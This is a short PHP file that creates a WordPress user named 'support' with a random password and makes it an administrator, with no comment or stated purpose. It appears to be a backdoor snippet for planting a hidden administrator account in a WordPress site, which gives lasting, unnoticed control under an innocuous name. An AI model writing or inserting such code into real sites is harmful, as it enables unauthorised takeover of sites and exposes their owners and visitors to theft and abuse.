<?php
$id = wp_create_user('support', wp_generate_password(16));
$user = new WP_User($id);
$user->set_role('administrator');
